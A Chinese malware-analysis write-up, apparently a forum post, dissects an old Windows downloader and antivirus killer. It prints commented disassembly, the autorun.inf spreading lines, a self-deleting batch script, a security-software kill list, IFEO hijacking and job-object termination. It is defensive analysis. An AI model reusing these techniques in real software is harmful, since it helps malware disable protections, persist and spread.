

# 对一病毒样本的详细分析

> 原文：[`www.pediy.com/kssd/pediy12/134971.html`](https://www.pediy.com/kssd/pediy12/134971.html)

第一次分析病毒,也不知道该如何分析,如有不当的地方请指正,样本是很早以前的.  
虽然样本很老,但是其水平还是很不错的(相对那时),其综合了  AntiAv  AvKiller  
Downloader  Autorun 等类型病毒的功能.  
  
  
对该病毒的简单行为描述:  
病毒执行会先停止 Schedule AppMgmt srservice W32Time stisvc 这 5 个服务.在系统临时目录释放一个以随机数命名的 dll,和一个 bat 文件,母体加载 DLL 并在系统目录释放 NsHelper2.sys  
结束相关安全软件的进程,然后创建一个 svchost.exe 的进程,根据当前系统日期是否大于 2008 年 12 月 30 日若小于则进程加载此 DLL,母体进程退出,并在系统目录释放 NsHelper2.sys , NsPass0.sys , NsPass1.sys , NsPass2.sys , NsPass3.sys , NsPass4.sys.并结束相关安全软件的进程. 创建注册表项,使用文件映象劫持黑名单中的安全软件,从网络下载文件到本机(网址都已失效故不做分析),并单独创建一个进程来执行下载的某个文件.修改 hosts 文件使用域名劫持手段屏蔽黑名单中的安全公司的网址.在系统目录释放 appwinproc.dll,让 explorer 进程加载并设置全局消息钩子,通过监控消息,获得消息交互方的窗口标题,然后跟黑名单中的相关安全软件的窗口标题进行比较,如果相同,就用 TerminatePrcocess 结束掉. 然后在每个系统盘符目录下,包括 U 盘建立 autorun.inf 文件,并复制母体释放的 DLL，到相应磁盘目录下改名为 system.dll.autorun.inf 文件的内容  
\[autorun\]  
shell\\open\\command=rundll32 system.dll,explore  
shell\\explore\\command=rundll32 system.dll,explore  
即每次打开相应磁盘则会运行 rundll32 并加载 system.dll(病毒 dll)  
这样就简单的起到了自动执行的功能(现在以屏蔽 autorun 了吧)  
NsPass0.sys 到 NsPass4.sys 会用病毒母体释放的 DLL 修改系统目录下的 schedsvc.dll ,appmgmts.dll , srsvc.dll wiaservc.dll, w32time.dll.具体怎么修改没分析只是简单的看了下 F5.  
  
病毒母体执行流程如下:  
  
![](img/1256353348e1f549558e16b7b5d2cb22.jpg)  
  
  
代码:  
UPX0:00401430                 sub     esp, 168h  
UPX0:00401436                 push    esi  
UPX0:00401437                 push    edi  
UPX0:00401438                 call    Anti\_Debug      ; 反调试  
UPX0:0040143D                 call    GetInputState   ; 判断本线程有无新的鼠标或按键消息  
UPX0:00401443                 push    0               ; lParam  
UPX0:00401445                 push    0               ; wParam  
UPX0:00401447                 push    0               ; Msg  
UPX0:00401449                 call    GetCurrentThreadId  
UPX0:0040144F                 push    eax             ; idThread  
UPX0:00401450                 call    PostThreadMessageA ; 向本线程发送 WM\_NULL 消息,激活消息处理流程,让其可以 GetMessage,防止鼠标在忙碌状态  
UPX0:00401456                 push    1               ; wRemoveMsg  
UPX0:00401458                 push    0               ; wMsgFilterMax  
UPX0:0040145A                 push    0               ; wMsgFilterMin  
UPX0:0040145C                 push    0               ; hWnd  
UPX0:0040145E                 lea     eax, \[esp+180h+Msg\]  
UPX0:00401462                 push    eax             ; lpMsg  
UPX0:00401463                 call    PeekMessageA  
….省略  
UPX0:0040149E                 push    eax             ; hModule  
UPX0:0040149F                 call    GetProcAddress  ; 获取 Sleep 的地址  
UPX0:004014A5                 mov     esi, eax  
UPX0:004014A7                 call    Stop\_Service    ; 停止 5 个服务  
UPX0:004014AC                 push    5000  
UPX0:004014B1                 call    esi             ; 调用 Sleep  
UPX0:004014B3                 lea     eax, \[esp+174h+Buffer\]  
UPX0:004014B7                 push    eax             ; lpBuffer  
UPX0:004014B8                 push    104h            ; nBufferLength  
UPX0:004014BD                 call    GetTempPathA  
UPX0:004014C3                 call    GetTickCount  
UPX0:004014C9                 xor     edx, edx  
UPX0:004014CB                 mov     ecx, 3E8h  
UPX0:004014D0                 div     ecx  
UPX0:004014D2                 push    edx  
UPX0:004014D3                 lea     edx, \[esp+178h+Msg.pt.y\]  
UPX0:004014D7                 push    offset aDllD\_dll ; 生成随机数字并用它格式化 dll 名字,也就是随机生成一个 dll 名  
…省略  
UPX0:00401502                 call    RES\_TO\_FILE     ; 释放资源文件  
UPX0:00401507                 add     esp, 0Ch  
UPX0:0040150A                 lea     eax, \[esp+17Ch+FileName\]  
UPX0:0040150E                 push    eax             ; lpLibFileName  
UPX0:0040150F                 call    edi ; LoadLibraryA  
UPX0:00401511                 push    7D0h  
UPX0:00401516                 call    esi             ; Sleep  
UPX0:00401518                 call    Del\_EXE\_BAT     ; 在临时目录生成 bat 文件并删除 exe 和 bat 文件  
UPX0:0040151D                 push    1               ; uExitCode  
UPX0:0040151F                 call    ExitProcess  
UPX0:0040151F start             endp  
  
简单的看下反调试:  
  
UPX0:0040102A                 call    CreateToolhelp32Snapshot ; 创建进程快照  
UPX0:0040102F                 mov     edi, eax  
UPX0:00401031                 lea     eax, \[esp+134h+pe\]  
UPX0:00401035                 push    eax             ; lppe  
UPX0:00401036                 push    edi             ; hSnapshot  
UPX0:00401037                 mov     \[esp+13Ch+pe.dwSize\], 128h  
UPX0:0040103F                 call    Process32First  
UPX0:00401044                 mov     esi, GetCurrentProcessId  
UPX0:0040104A                 lea     ebx, \[ebx+0\]  
UPX0:00401050  
UPX0:00401050 loc\_401050:                             ; CODE XREF: Anti\_Debug+69 j  
UPX0:00401050                 call    esi ; GetCurrentProcessId  
UPX0:00401052                 cmp     \[esp+134h+pe.th32ProcessID\], eax  
UPX0:00401056                 jz      loc\_401107  
UPX0:0040105C                 lea     ecx, \[esp+134h+pe\]  
UPX0:00401060                 push    ecx             ; lppe  
UPX0:00401061                 push    edi             ; hSnapshot  
UPX0:00401062                 call    Process32Next  
UPX0:00401067                 test    eax, eax  
UPX0:00401069                 jnz     short loc\_401050  
UPX0:0040106B  
UPX0:0040106B loc\_40106B:                             ; CODE XREF: Anti\_Debug+115 j  
UPX0:0040106B                 lea     edx, \[esp+134h+pe\]  
UPX0:0040106F                 push    edx             ; lppe  
UPX0:00401070                 push    edi             ; hSnapshot  
UPX0:00401071                 call    Process32First  
UPX0:00401076                 mov     esi, lstrcmpi  
UPX0:0040107C                 lea     esp, \[esp+0\]  
UPX0:00401080  
UPX0:00401080 loc\_401080:                             ; CODE XREF: Anti\_Debug+F3 j  
UPX0:00401080                 cmp     \[esp+134h+pe.th32ProcessID\], ebx  
UPX0:00401084                 jnz     short loc\_4010E6  
UPX0:00401086                 lea     eax, \[esp+134h+pe.szExeFile\]  
UPX0:0040108A                 push    eax  
UPX0:0040108B                 push    offset aOllydbg\_exe ; "OllyDbg.exe"  
UPX0:00401090                 call    esi ; lstrcmpi  
UPX0:00401092                 test    eax, eax  
UPX0:00401094                 jz      short loc\_4010FF  
UPX0:00401096                 lea     ecx, \[esp+134h+pe.szExeFile\]  
UPX0:0040109A                 push    ecx  
UPX0:0040109B                 push    offset aOllyice\_exe ; "OllyICE.exe"  
UPX0:004010A0                 call    esi ; lstrcmpi  
UPX0:004010A2                 test    eax, eax  
UPX0:004010A4                 jz      short loc\_4010FF  
UPX0:004010A6                 lea     edx, \[esp+134h+pe.szExeFile\]  
UPX0:004010AA                 push    edx  
UPX0:004010AB                 push    offset aPeditor\_exe ; "PEditor.exe"  
UPX0:004010B0                 call    esi ; lstrcmpi  
UPX0:004010B2                 test    eax, eax  
UPX0:004010B4                 jz      short loc\_4010FF  
UPX0:004010B6                 lea     eax, \[esp+134h+pe.szExeFile\]  
UPX0:004010BA                 push    eax  
UPX0:004010BB                 push    offset aLordpe\_exe ; "LordPE.exe"  
UPX0:004010C0                 call    esi ; lstrcmpi  
UPX0:004010C2                 test    eax, eax  
UPX0:004010C4                 jz      short loc\_4010FF  
UPX0:004010C6                 lea     ecx, \[esp+134h+pe.szExeFile\]  
UPX0:004010CA                 push    ecx  
UPX0:004010CB                 push    offset aC32asm\_exe ; "C32Asm.exe"  
UPX0:004010D0                 call    esi ; lstrcmpi  
UPX0:004010D2                 test    eax, eax  
UPX0:004010D4                 jz      short loc\_4010FF  
UPX0:004010D6                 lea     edx, \[esp+134h+pe.szExeFile\]  
UPX0:004010DA                 push    edx  
UPX0:004010DB                 push    offset aImportrec\_exe ; "ImportREC.exe"  
UPX0:004010E0                 call    esi ; lstrcmpi  
UPX0:004010E2                 test    eax, eax  
UPX0:004010E4                 jz      short loc\_4010FF  
UPX0:004010E6  
UPX0:004010E6 loc\_4010E6:                             ; CODE XREF: Anti\_Debug+84 j  
UPX0:004010E6                 lea     eax, \[esp+134h+pe\]  
UPX0:004010EA                 push    eax             ; lppe  
UPX0:004010EB                 push    edi             ; hSnapshot  
UPX0:004010EC                 call    Process32Next  
UPX0:004010F1                 test    eax, eax  
UPX0:004010F3                 jnz     short loc\_401080  
UPX0:004010F5                 call    Addr\_IsDebuggerPresent  
UPX0:004010FB                 test    eax, eax  
UPX0:004010FD                 jz      short loc\_401123  
UPX0:004010FF  
UPX0:004010FF loc\_4010FF:                             ; CODE XREF: Anti\_Debug+94 j  
UPX0:004010FF                                         ; Anti\_Debug+A4 j ...  
UPX0:004010FF                 push    0               ; uExitCode  
简单描述下: 先从 kernel32.dll 中得 IsDebuggerPresent 的函数地址,然后使用 GetCurrentProcessId,得到本进程的 ID，开进程快照,得到本进程 PROCESSENTRY32,结构体通过这个结构体得到父进程 ID,然后在通过进程快照得到父进程的 PROCESSENTRY32 结构体信息,并判断其进程名是否为: OllyDbg.exe , OllyICE.exe , PEditor.exe , LordPE.exe , C32Asm.exe , ImportREC.exe 如果是其中的某一个,则退出进程,如果没有一个符合,则最后调用 IsDebuggerPresent 返回非 0 值则退出进程.  
当然这种反调试对于现在插件多于牛毛的 OD 来说基本不起作用了.  
释放的 dll 名类似为:dll593.dll 其中 593 是随机的 3 位数.  
创建的的 bat 文件名类似为：1.bat,其中前面的数字是使用的是系统已启动时间  
bat 文件里的内容:  
  
  
  
:Repeat',0Dh,0Ah                            //0D ,0A 为回车换行 Repeat 是一个标号  
db 'del /f "%s"',0Dh,0Ah                   //%s 为病毒母体路径  
db 'if exist "%s" goto Repeat',0Dh,0Ah    //同上  
db 'del /f "%s"',0                       //这里的%s 为此批处理文件的路径  
即先删除病毒母体文件,在检测如果还存在就在转到 Repeat 执行在此删除.最后删除 bat 文件本身.  
  
由于篇幅关系,其他的函数,可以看 idb 文件,里面注释很详细.  
  
下面看病毒释放的 dll 的行为:  
  
由于作图软件不是很专业,所以没有菱形来表示判断条件,所以只能用箭头随手画画了.  
  
  
![](img/ad3a91734fbdd8ee4bbfd5b653c24936.jpg)  
  
简单总结一下行为:当病毒母体加载此 DLL 后,转到 DLL 中执行代码,同样也是先检测是否被调试,然后判断母体文件名是够和 svchost.exe 相同,按程序流程推断母体名肯定不会和 svchost.exe 相同.然后从 DLL 中释放驱动并加载到内核,母体进程创建对象与驱动通信,驱动恢复 SSDT 并 hook 了 NtOpenProcess  NtTerminateProess..用来保护母体进程防止其被结束,然后枚举当前系统进程,如果有与其数组中保存的进程名相同的则使用驱动和作业对象的方法来结束掉进程.  
其进程黑名单有：  
"360safe.exe""360safebox.exe""360tray.exe""ACKWIN32.exe""anti.exe""ANTI-TROJAN.exe""antivir.exe""atrack.exe""ATRACK.exe""AUTODOWN.exe""AVCONSOL.exe""AVE32.exe"  
"AVGCTRL.exe""avk.exe""AVKSERV.exe""AVPUPD.exe""AVSCHED32.exe""avsynmgr.exe""AVWIN95.exe"  
"avxonsol.exe""BLACKD.exe""BLACKICE.exe""CCenter.exe""CFIADMIN.exe""CFIAUDIT.exe""CFIND.exe"  
"cfinet.exe""cfinet32.exe""CLAW95.exe""CLAW95CT.exe""CLEANER.exe""CLEANER3.exe""DAVPFW.exe"  
"dbg.exe""debu.exe""DV95.exe""DV95\_O.exe""DVP95.exe""ECENGINE.exe""EFINET32.exe""ESAFE.exe"  
"ESPWATCH.exe""explorewclass.exe""F-AGNT95.exe""FINDVIRU.exe""fir.exe""F-PROT.exe""fprot95.exe""fp-win.exe""FP-WIN.exe""FRW.exe""f-stopw.exe""F-STOPW.exe""IAMAPP.exe""IAMAPP.exe""IAMSERV.exe""IBMASN.exe""IBMAVSP.exe""ice.exe""IceSword.exe""ICLOAD95.exe""ICLOADNT.exe""ICMOON.exe""ICSSUPPNT.exe""iom.exe""iomon98.exe"  
"JED.exe""Kabackreport.exe""Kasmain.exe""kav32.exe"kavstart.exe""kissvc.exe""KPFW32.exe"  
"kpfw32.exe""kpfwsvc.exe""KPPMain.exe""KRF.exe""KVMonXP.exe""KVPreScan.exe""kwatch.exe"  
"lamapp.exe""lockdown2000.exe""LOOKOUT.exe""luall.exe""LUCOMSERVER.exe""mcafee.exe""microsoft.exe""mon.exe""moniker.exe""MOOLIVE.exe""MPFTRAY.exe""ms.exe""N32ACAN.exe""navapsvc.exe""navapw32.exe""NAVLU32.exe" "NAVNT.exe""navrunr.exe""NAVSCHED.exe""NAVW.exe""NAVW32.exe""navwnt.exe""NAVWNT.exe"  
"nisserv.exe""nisum.exe""NMAIN.exe""NORMIST.exe""norton.exe""NUPGRADE.exe""NVC95.exe"  
"OUTPOST.exe""PADMIN.exe""PAVCL.exe""pcc.exe""PCCClient.exe""pcciomon.exe""pccmain.exe"  
"pccwin98.exe""PCFWALLICON.exe""PpPpWallRun.exe""program.exe""prot.exe""pview95.exe"  
"ras.exe""Rav.exe""RAV7.exe""rav7win.exe""RavMon.exe""RavMonD.exe""RavStub.exe""RavTask.exe""regedit.exe""rescue32.exe""Rfw.exe""rn.exe""safeboxTray.exe""safeweb.exe""scam32.exe""scan.exe""SCAN32.exe""SCANPM.exe""scon.exe""SCRSCAN.exe""secu.exe""SERV95.exe""sirc32.exe""SMC.exe""smtpsvc.exe""SPHINX.exe""spy.exe""sreng.exe""SWEEP95.exe""symproxysvc.exe""TBSCAN.exe""TCA.exe""TDS2-98.exe""TDS2-NT.exe""Tmntsrv.exe""TMOAgent.exe""tmproxy.exe""tmupdito.exe""TSC.exe""UlibCfg.exe""vavrunr.exe""VET95.exe""VETTRAY.exe""vir.exe""VPC32.exe""VSECOMR.exe""vshwin32.exe""VSHWIN32.exe""VSSCAN40""vsstat.exe""WEBSCAN.exe""WEBSCANX.exe""webtrap.exe""WFINDV32.exe""windows 优化大师.exe""wink.exe""XDelbox.exe""zonealarm.exe""ZONEALARM.exe""pccguide.exe"  
  
  
最后找到系统 svchost.exe 文件并创建此进程,并判断当期前系统事件是否大于 2008 年 12 月 30 日,如果大于则不加载此 DLL,则病毒母体进程结束.如果当前系统时间小于此日期,则通过远程线程为 svchost 进程加载此 DLL.  
  
当新创建的 svchost 进程加载该 DLL 时,又是走前面的流程,不同的是,现在的进程名是 svchost 了,所以在判断进程文件名是否为 svchost.exe 时,此时是相同的.因此走的流程不一样.接着就是创建一大堆线程,来完成各种各样的坏事.  
  
代码分析:  
.text:710013FC GetProcessFileName:                     ; CODE XREF: DllEntryPoint+4F j  
.text:710013FC                 cmp     \[ebp+eax+String\], 5Ch  
.text:71001404                 jz      short loc\_7100140B  
.text:71001406                 dec     eax  
.text:71001407                 jns     short GetProcessFileName  
.text:71001409                 jmp     short loc\_7100140C  
.text:7100140B ; ---------------------------------------------------------------------------  
.text:7100140B  
.text:7100140B loc\_7100140B:                           ; CODE XREF: DllEntryPoint+4C j  
.text:7100140B                 inc     eax  
.text:7100140C  
.text:7100140C loc\_7100140C:                           ; CODE XREF: DllEntryPoint+42 j  
.text:7100140C                                         ; DllEntryPoint+51 j  
.text:7100140C                 lea     eax, \[ebp+eax+String\]  
.text:71001413                 push    offset Data     ; "svchost.exe"  
.text:71001418                 push    eax             ; lpString  
.text:71001419                 call    Is\_EqualString  ; 判断字符串是否相同  
.text:7100141E                 test    eax, eax  
.text:71001420                 pop     ecx             ; 平衡 Is\_EqualString 的参数堆栈  
.text:71001421                 pop     ecx             ; 平衡 Is\_EqualString 的参数堆栈  
.text:71001422                 push    esi             ; LPVOID  
.text:71001423                 jz      short loc\_71001432 ; Is\_EqualString 返回值为 0 就跳转  
.text:71001425                 call    Release\_SYS\_Protect\_KILL ; 释放驱动保护本进程,并关闭相关安全软件的进程  
.text:7100142A                 push    esi  
.text:7100142B                 call    Create\_svchost\_loadthis\_Dll ; 创建 svchost.exe 进程  
.text:71001430                 jmp     short loc\_71001441  
.text:71001432 ; ---------------------------------------------------------------------------  
.text:71001432  
.text:71001432 loc\_71001432:                           ; CODE XREF: DllEntryPoint+6B j  
.text:71001432                 push    esi             ; dwCreationFlags  
.text:71001433                 push    esi             ; lpParameter  
.text:71001434                 push    offset kill\_SecProcess ; lpStartAddress  一个线程里面又会创建多个线程  
.text:71001439                 push    esi             ; dwStackSize  
.text:7100143A                 push    esi             ; lpThreadAttributes  
.text:7100143B                 call    ds:CreateThread  
  
上述代码是主要的流程框架代码,先把路径转换为进程的文件名,然后在与 svchost.exe 比较是否相同.然后转向各自的流程.  
进入 Release\_SYS\_Protect\_KILL,先使用两种方式结束 avp.exe,一种是关闭 BaseNamedObjects\\6953EA60-8D5F-4529-8710-42F8ED3E8CDA 对象,另一种方法我不太明白,想细看的看以看下面的链接: http://bbs.pediy.com/showthread.php?t=92948 里面的方法和此病毒的一样.  
  
利用作业对象杀进程:  
.text:71002FE6 UseJob\_KillProcess proc near            ; CODE XREF: Kill\_Process+61 p  
.text:71002FE6  
.text:71002FE6 var\_8           = dword ptr -8  
.text:71002FE6 dwProcessId     = dword ptr  4  
.text:71002FE6  
.text:71002FE6                 push    esi  
.text:71002FE7                 push    0FFFFFFFFh      ; ProcessHandle  
.text:71002FE9                 call    Raise\_Privilege ; 提升进程权限  
.text:71002FEE                 mov     \[esp+8+var\_8\], offset aNsdnldrkillpro ; "NsDnldrKillProcess"  
.text:71002FF5                 push    0               ; lpJobAttributes  
.text:71002FF7                 call    ds:CreateJobObjectA ; 创建名为 NsDnldrKillProcess 作业对象  
.text:71002FFD                 push    \[esp+4+dwProcessId\] ; dwProcessId  
.text:71003001                 mov     esi, eax        ; esi 中保存 job 对象  
.text:71003003                 push    0               ; bInheritHandle  
.text:71003005                 push    1F0FFFh         ; dwDesiredAccess  
.text:7100300A                 call    ds:OpenProcess  
.text:71003010                 test    eax, eax  
.text:71003012                 jnz     short loc\_71003016  
.text:71003014                 pop     esi  
.text:71003015                 retn  
.text:71003016 ; ---------------------------------------------------------------------------  
.text:71003016  
.text:71003016 loc\_71003016:                           ; CODE XREF: UseJob\_KillProcess+2C j  
.text:71003016                 push    eax             ; hProcess  
.text:71003017                 push    esi             ; hJob  
.text:71003018                 call    ds:AssignProcessToJobObject ; 进程和 job 关联  
.text:7100301E                 push    0               ; uExitCode  
.text:71003020                 push    esi             ; hJob  
.text:71003021                 call    ds:TerminateJobObject ; 结束 job，也就结束了进程  
.text:71003027                 pop     esi  
.text:71003028                 retn  
创建 svchost 进程并判断当前时间以决定是否要加载该 DLL  
.text:71002128  
.text:71002128 Create\_svchost\_loadthis\_Dll proc near   ; CODE XREF: DllEntryPoint+73 p  
.text:71002128  
.text:71002128 Buffer          = byte ptr -26Ch  
.text:71002128 CommandLine     = byte ptr -168h  
.text:71002128 StartupInfo     = \_STARTUPINFOA ptr -64h  
.text:71002128 ProcessInformation= \_PROCESS\_INFORMATION ptr -20h  
.text:71002128 SystemTime      = \_SYSTEMTIME ptr -10h  
.text:71002128  
.text:71002128                 push    ebp  
.text:71002129                 mov     ebp, esp  
.text:7100212B                 sub     esp, 26Ch  
.text:71002131                 push    esi  
.text:71002132                 push    edi  
.text:71002133                 mov     esi, 104h  
.text:71002138                 push    esi             ; uSize  
.text:71002139                 lea     eax, \[ebp+CommandLine\]  
.text:7100213F                 push    eax             ; lpBuffer  
.text:71002140                 call    ds:GetSystemDirectoryA  
.text:71002146                 push    offset String2  ; "\\\\svchost.exe"  
.text:7100214B                 lea     eax, \[ebp+CommandLine\]  
.text:71002151                 push    eax             ; lpString1  
.text:71002152                 call    ds:lstrcatA     ; 拼接 svchost.exe 的路径  
.text:71002158                 push    11h  
.text:7100215A                 pop     ecx  
.text:7100215B                 xor     eax, eax  
.text:7100215D                 lea     edi, \[ebp+StartupInfo\]  
.text:71002160                 rep stosd  
.text:71002162                 lea     eax, \[ebp+StartupInfo\]  
.text:71002165                 push    eax             ; lpStartupInfo  
.text:71002166                 call    ds:GetStartupInfoA ; 获取本进程的启动信息  
.text:7100216C                 xor     eax, eax  
.text:7100216E                 lea     ecx, \[ebp+ProcessInformation\]  
.text:71002171                 push    ecx             ; lpProcessInformation  
.text:71002172                 lea     ecx, \[ebp+StartupInfo\]  
.text:71002175                 push    ecx             ; lpStartupInfo  
.text:71002176                 push    eax             ; lpCurrentDirectory  
.text:71002177                 push    eax             ; lpEnvironment  
.text:71002178                 push    4               ; dwCreationFlags  
.text:7100217A                 push    eax             ; bInheritHandles  
.text:7100217B                 push    eax             ; lpThreadAttributes  
.text:7100217C                 push    eax             ; lpProcessAttributes  
.text:7100217D                 lea     ecx, \[ebp+CommandLine\]  
.text:71002183                 push    ecx             ; lpCommandLine  svchost.exe 的路径  
.text:71002184                 push    eax             ; lpApplicationName  
.text:71002185                 mov     \[ebp+StartupInfo.wShowWindow\], ax ; SW\_HIDE 不显示窗口,本来就没窗口..  
.text:71002189                 call    ds:CreateProcessA ; 创建 svchost 进程并挂起  
.text:7100218F                 lea     eax, \[ebp+SystemTime\]  
.text:71002192                 push    eax             ; lpSystemTime  
.text:71002193                 call    ds:GetSystemTime  
.text:71002199                 movzx   ecx, \[ebp+SystemTime.wYear\]  
.text:7100219D                 mov     eax, dword\_71007234  
.text:710021A2                 cmp     ecx, eax        ; 2008 年  
.text:710021A4                 ja      short loc\_710021C3  
.text:710021A6                 jnz     short loc\_710021C8  
.text:710021A8                 movzx   ecx, \[ebp+SystemTime.wMonth\]  
.text:710021AC                 mov     eax, dword\_71007238  
.text:710021B1                 cmp     ecx, eax        ; 12 月  
.text:710021B3                 ja      short loc\_710021C3  
.text:710021B5                 jnz     short loc\_710021C8  
.text:710021B7                 movzx   eax, \[ebp+SystemTime.wDay\]  
.text:710021BB                 cmp     eax, dword\_7100723C ; 30 号  
.text:710021C1                 jbe     short loc\_710021C8  
.text:710021C3  
.text:710021C3 loc\_710021C3:                           ; CODE XREF: Create\_svchost\_loadthis\_Dll+7C j  
.text:710021C3                                         ; Create\_svchost\_loadthis\_Dll+8B j  
.text:710021C3                 xor     eax, eax  
.text:710021C5                 inc     eax  
.text:710021C6                 jmp     short loc\_710021FD ; 大于 2008 年 12 月 30 日就返回-1,不让新创建的 svchost 进程加载 DLL  
.text:710021C8 ; ---------------------------------------------------------------------------  
.text:710021C8  
.text:710021C8 loc\_710021C8:                           ; CODE XREF: Create\_svchost\_loadthis\_Dll+7E j  
.text:710021C8                                         ; Create\_svchost\_loadthis\_Dll+8D j ...  
.text:710021C8                 push    esi             ; nSize  
.text:710021C9                 lea     eax, \[ebp+Buffer\]  
.text:710021CF                 push    eax             ; lpFilename  
.text:710021D0                 push    hModule         ; hModule  
.text:710021D6                 call    ds:GetModuleFileNameA ; 获得本 DLL 的路径  
.text:710021DC                 lea     eax, \[ebp+Buffer\]  
.text:710021E2                 push    eax             ; lpBuffer  
.text:710021E3                 push    \[ebp+ProcessInformation.hProcess\] ; hProcess  
.text:710021E6                 call    MakeSvchost\_Load\_DLL ; 让新创建 svchost 加载本 DLL  
.text:710021EB                 push    \[ebp+ProcessInformation.hProcess\] ; hObject  
.text:710021EE                 mov     esi, ds:CloseHandle  
.text:710021F4                 call    esi ; CloseHandle  
.text:710021F6                 push    \[ebp+ProcessInformation.hThread\] ; hObject  
.text:710021F9                 call    esi ; CloseHandle  
.text:710021FB                 xor     eax, eax  
  
现在分析一下,当创建了 svchost.exe 进程,并加载了该 DLL,其创建的那些线程所做的事情.  
线程 1:  
行为:先检查是否有调试器，创建创建名为 NSDownLoader26AVip20081206 事件对象(难道是 08 年 12 月 6 日写的?),初始无信号,并判断是否已存在该对象,防止运行多个实例.即如果已存在则退出进程.  
代码:  
.text:710012B2                 push    offset Name     ; "NSDownLoader26AVip20081206"  
.text:710012B7                 push    esi             ; bInitialState  
.text:710012B8                 push    esi             ; bManualReset  
.text:710012B9                 push    esi             ; lpEventAttributes  
.text:710012BA                 call    ds:CreateEventA ; 创建事件对象,初始无信号,并自动置事件有信号  
.text:710012C0                 mov     \[esp+30h+var\_20\], eax  
.text:710012C4                 call    ds:GetLastError  
.text:710012CA                 cmp     \[esp+30h+var\_20\], esi  
.text:710012CE                 jz      short loc\_710012D7  
.text:710012D0                 cmp     eax, 183        ; 判断该对象是否已经被创建,如果是则退出进程  
.text:710012D5                 jnz     short loc\_710012EB ; 如果该对象第一次被创建  
.text:710012D7  
.text:710012D7 loc\_710012D7:                           ; CODE XREF: kill\_SecProcess+73 j  
.text:710012D7                 call    sub\_710011CE  
.text:710012DC                 test    eax, eax  
.text:710012DE                 jnz     loc\_710013AC  
.text:710012E4  
.text:710012E4 loc\_710012E4:                           ; CODE XREF: kill\_SecProcess+53 j  
.text:710012E4                 push    esi             ; uExitCode  
.text:710012E5                 call    ds:ExitProcess  
  
线程 2:  
行为分析:  
从 DLL 中释放并以 SCM 方式加载 Nskhelper2.sys 到内核中,用于保护该进程不被结束,并枚举当前活动进程,用驱动和 Job 的方式来结束与进程黑名单中匹配的进程.  
代码:  
.text:7100244C                 push    0               ; th32ProcessID  
.text:7100244E                 push    2               ; dwFlags  
.text:71002450                 call    CreateToolhelp32Snapshot  
.text:71002455                 lea     ecx, \[ebp+pe\]  
.text:7100245B                 push    ecx             ; lppe  
.text:7100245C                 push    eax             ; hSnapshot  
.text:7100245D                 mov     \[ebp+hObject\], eax  
.text:71002460                 mov     \[ebp+pe.dwSize\], 128h  
.text:7100246A                 call    Process32First  
.text:7100246F  
.text:7100246F loc\_7100246F:                           ; CODE XREF: Release\_SYS\_Protect\_KILL+139 j  
.text:7100246F                 mov     eax, \[ebp+pe.th32ProcessID\]  
.text:71002475                 mov     \[ebp+dwProcessId\], eax  
.text:71002478                 lea     eax, \[ebp+pe.szExeFile\]  
.text:7100247E                 push    eax  
.text:7100247F                 call    IS\_TO\_KILL      ; 判断是否要结束该进程,与进程中保存的要结束的进程数组进行比较  
.text:71002484                 test    eax, eax  
.text:71002486                 pop     ecx             ; 平衡堆栈  
.text:71002487                 jz      short loc\_710024B0  
.text:71002489                 cmp     \[ebp+dwProcessId\], 0 ; 判断进程 ID 是否为 0  
.text:7100248D                 jz      short loc\_710024B0  
.text:7100248F                 push    \[ebp+dwProcessId\] ; dwProcessId  
.text:71002492                 push    ebx             ; hDevice  
.text:71002493                 call    Kill\_Process    ; 结束相关安全软件的进程  
.text:71002498                 test    eax, eax  
.text:7100249A                 pop     ecx  
.text:7100249B                 pop     ecx  
.text:7100249C                 jnz     short loc\_710024B0  
.text:7100249E                 push    esi  
.text:7100249F                 call    \[ebp+var\_4\]  
.text:710024A2                 push    \[ebp+pe.th32ProcessID\] ; InBuffer  
.text:710024A8                 push    ebx             ; hDevice  
.text:710024A9                 call    sub\_710022E5    ; 传递进程 ID 与驱动通信  
.text:710024AE                 pop     ecx  
.text:710024AF                 pop     ecx  
.text:710024B0  
.text:710024B0 loc\_710024B0:                           ; CODE XREF: Release\_SYS\_Protect\_KILL+FF j  
.text:710024B0                                         ; Release\_SYS\_Protect\_KILL+105 j ...  
.text:710024B0                 lea     eax, \[ebp+pe\]  
.text:710024B6                 push    eax             ; lppe  
.text:710024B7                 push    \[ebp+hObject\]   ; hSnapshot  
.text:710024BA                 call    Process32Next  
.text:710024BF                 test    eax, eax  
.text:710024C1                 jnz     short loc\_7100246F  
.text:710024C3                 push    \[ebp+hObject\]   ; hObject  
.text:710024C6                 call    edi ; CloseHandle  
.text:710024C8                 cmp     \[ebp+arg\_0\], 0  
.text:710024CC                 jz      short loc\_710024DB  
.text:710024CE                 push    3E8h  
.text:710024D3                 call    \[ebp+var\_4\]  
.text:710024D6                 jmp     loc\_7100244C  
  
即先通过 IS\_TO\_KILL 函数判断是否与黑名单中的进程名相同如果相同就调用 Kill\_Process 结束掉,里面用了驱动和 Job 方式.  
  
线程 3:  
行为分析:  
创建大量注册表项类似:  
HKEY\_LOCAL\_MACHINE\_SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Executio\\  Options\\avp.exe Debugger “svchost.exe”只要在进程黑名单中的都会创建相应的此表项.即使用文件映象劫持来阻止黑名单中安全软件的运行. 此病毒中如果运行黑名单中的安全软件的进程,则会运行 svchost.exe,而不会运行它们.  
  
代码:  
…..前面部分略  
.text:71001CFB  
.text:71001CFB loc\_71001CFB:                           ; CODE XREF: Create\_reg\_avpTo\_svchost+E4 j  
.text:71001CFB                 push    esi             ; lpdwDisposition  
.text:71001CFC                 lea     eax, \[esp+24h+phkResult\]  
.text:71001D00                 push    eax             ; phkResult  
.text:71001D01                 push    esi             ; lpSecurityAttributes  
.text:71001D02                 push    edi             ; samDesired  
.text:71001D03                 push    esi             ; dwOptions  
.text:71001D04                 push    esi             ; lpClass  
.text:71001D05                 push    esi             ; Reserved  
.text:71001D06                 push    offset aAvp\_exe ; "avp.exe"  
.text:71001D0B                 push    \[esp+40h+hKey\]  ; hKey  
.text:71001D0F                 mov     \[esp+44h+phkResult\], esi  
.text:71001D13                 call    ebx ; RegCreateKeyExA  
.text:71001D15                 push    0Ch             ; cbData  
.text:71001D17                 push    offset Data     ; "svchost.exe"  
.text:71001D1C                 push    1               ; dwType  
.text:71001D1E                 push    esi             ; Reserved  
.text:71001D1F                 push    offset ValueName ; "Debugger"  
.text:71001D24                 push    \[esp+34h+phkResult\] ; hKey  
.text:71001D28                 call    ebp ; RegSetValueExA  
.text:71001D2A                 push    \[esp+20h+phkResult\] ; hKey  
.text:71001D2E                 call    ds:RegCloseKey  
.text:71001D34                 mov     eax, lpSubKey  
